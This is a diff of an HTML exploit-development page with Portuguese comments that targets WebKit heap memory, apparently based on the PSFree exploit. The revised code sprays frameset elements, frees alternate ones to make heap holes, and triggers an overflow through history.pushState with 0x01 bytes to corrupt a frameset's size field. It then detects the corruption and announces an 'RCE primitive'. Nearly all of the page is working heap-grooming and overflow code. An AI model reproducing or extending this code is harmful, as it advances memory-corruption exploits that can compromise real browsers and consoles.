@@ -1,32 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Size Downgrade: Buscando Strings Inline</title>
+    <title>PSFree Logic: Frameset Class Finder</title>
     <style>
-        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
         button { 
-            font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ff00ff; background: #220022; color: #fff; cursor: pointer; margin-bottom: 10px;
+            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 15px;
         }
-        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #ff00ff; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 3px solid white; }
+        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
+        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 4px solid white; }
     </style>
 </head>
 <body>
 
-    <h1>Size Downgrade</h1>
-    <p>Tentando achar strings "Inline" onde o Length fica junto dos Dados.</p>
+    <h1>Frameset Class Finder</h1>
+    <p>Usando a vítima do PSFree em tamanhos maiores (fastMalloc).</p>
 
-    <button onclick="runTest(128 * 1024)">1. Testar 128 KB</button>
-    <button onclick="runTest(64 * 1024)">2. Testar 64 KB</button>
-    <button onclick="runTest(32 * 1024)">3. Testar 32 KB</button>
-    <button onclick="runTest(16 * 1024)">4. Testar 16 KB</button>
+    <button onclick="runTest(16384)">TESTAR 16 KB</button>
+    <button onclick="runTest(32768)">TESTAR 32 KB</button>
+    <button onclick="runTest(65536)">TESTAR 64 KB</button>
+    <button onclick="runTest(131072)">TESTAR 128 KB</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        // O Overflow precisa ser agressivo para cobrir o desalinhamento dos objetos menores
         const BASE_OFFSET = 709520; 
-        const OVERFLOW_AMT = 1024 * 128; // 128KB de cobertura
+        const OVERFLOW_AMT = 1024 * 32; // 32KB de overflow é suficiente
 
         var victims = [];
 
@@ -38,89 +37,99 @@
         }
 
         async function runTest(targetBytes) {
-            log(`--- TESTANDO TAMANHO: ${targetBytes / 1024} KB ---`);
-            
-            // Header estimado de 24 bytes para StringImpl
-            const payloadSize = targetBytes - 24;
+            log(`----------------------------------------`);
+            log(`INICIANDO TESTE: FRAMESET ${targetBytes / 1024} KB`);
 
-            // 1. Limpeza
+            // 1. CÁLCULO REVERSO DO PSFREE
+            // Queremos que o objeto final na memória tenha 'targetBytes'.
+            // UniqueArray tem 8 bytes de header.
+            const dataBytes = targetBytes - 8;
+            const elements = dataBytes / 8;
+            const commas = elements - 1;
+            
+            const rowsString = ",".repeat(commas);
+
+            log(`Gerando string com ${commas} vírgulas...`);
+
+            // 2. SPRAY
             victims = [];
-            await forceGC();
+            // Spray denso para encher o fastMalloc
+            const SPRAY_COUNT = 400; 
 
             try {
-                // 2. Spray de Strings Médias (TextDecoder)
-                let rawBuffer = new Uint8Array(payloadSize);
-                rawBuffer.fill(0x42); 
-                let decoder = new TextDecoder("utf-8");
-                let baseString = decoder.decode(rawBuffer);
-
-                // Aumentamos a quantidade porque os objetos são menores
-                // Queremos preencher o mesmo volume de RAM (~40MB)
-                const SPRAY_COUNT = Math.floor((40 * 1024 * 1024) / targetBytes);
-                
-                log(`Alocando ${SPRAY_COUNT} strings...`);
-                
                 for(let i=0; i<SPRAY_COUNT; i++) {
-                    let s = i + "_" + baseString.substring((i+"_").length);
-                    victims.push(s);
+                    let fset = document.createElement('frameset');
+                    fset.rows = rowsString;
+                    victims.push(fset);
                 }
 
-                // 3. Buracos
-                log("Abrindo buracos...");
-                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
+                // 3. BURACOS
+                log("Abrindo buracos no fastMalloc...");
+                for(let i=0; i<SPRAY_COUNT; i+=2) {
+                    victims[i].rows = ""; 
+                    victims[i] = null;
+                }
+
                 await forceGC();
 
-                // 4. Exploit
-                log("Disparando...");
+                // 4. EXPLOIT
+                log("Disparando Overflow...");
                 setTimeout(() => {
                     try {
                         let buffer = "A".repeat(BASE_OFFSET);
+                        // Escrevemos 0x01. No frameset, isso vai sobrescrever o '_size'.
+                        // _size = 0x01010101... (Gigante)
                         buffer += "\x01".repeat(OVERFLOW_AMT);
                         
-                        history.pushState({}, "downgrade", "/" + buffer);
+                        history.pushState({}, "frameset_opt", "/" + buffer);
 
-                        checkVictims(payloadSize);
+                        log("Verificando Framesets (OOM Detector)...");
+                        checkVictims();
 
                     } catch (e) {
-                        log("Erro: " + e.message);
+                        log("Erro JS: " + e.message);
                     }
                 }, 500);
 
             } catch(e) {
-                log("Erro Memória: " + e.message);
+                log("Erro de Alocação: " + e.message);
             }
         }
 
-        function checkVictims(expectedLen) {
-            let success = false;
+        function checkVictims() {
+            let found = false;
             for(let i=1; i<victims.length; i+=2) {
-                let s = victims[i];
-                if(!s) continue;
+                let fset = victims[i];
+                if(!fset) continue;
 
                 try {
-                    let err = new Error(s);
-                    let msg = err.message;
+                    // SE o tamanho foi corrompido para algo gigante,
+                    // acessar .rows vai tentar gerar uma string gigante.
+                    // Isso vai demorar muito ou dar erro de memória.
+                    
+                    let s = fset.rows;
 
-                    // SUCESSO (RCE)
-                    if (msg.length !== expectedLen) {
-                        log(`!!! JACKPOT !!! Length Corrompido com ${expectedLen+24} bytes!`, 'win');
-                        log(`Novo Tamanho: ${msg.length}`, 'win');
-                        alert("RCE UNLOCKED!");
-                        success = true;
-                        break;
+                    // Se leu rápido e o tamanho é normal, falhou.
+                    if (s.length > 0 && s.length < 10000000) {
+                        continue;
                     }
 
-                    // SUCESSO PARCIAL (Dados)
-                    if (msg.charCodeAt(0) === 1) {
-                         log(`[Dados Atingidos] String ${i} (Conteúdo sujo).`);
-                         success = true; // Sabemos que acertamos, só falta o header estar lá
-                         // Se acertamos dados mas não length em strings pequenas,
-                         // precisamos recuar o offset manualmente depois.
-                    }
+                    // Se o tamanho ficou absurdo (maior que o original)
+                    log(`!!! ANOMALIA !!! Frameset ${i} retornou string enorme!`, 'win');
+                    alert("RCE PRIMITIVE: FRAMESET!");
+                    found = true;
+                    break;
 
-                } catch(e) {}
+                } catch(e) {
+                    // SE DER ERRO AO LER, É VITÓRIA!
+                    // Significa que o tamanho era tão grande que o JS não conseguiu montar a string.
+                    log(`!!! JACKPOT !!! Erro ao ler Frameset ${i}: ${e.message}`, 'win');
+                    alert("RCE PRIMITIVE: FRAMESET CORRUPTED!");
+                    found = true;
+                    break;
+                }
             }
-            if(!success) log("Nada atingido. Tente outro tamanho.");
+            if(!found) log("Nenhum frameset afetado.");
         }
 
         async function forceGC() {
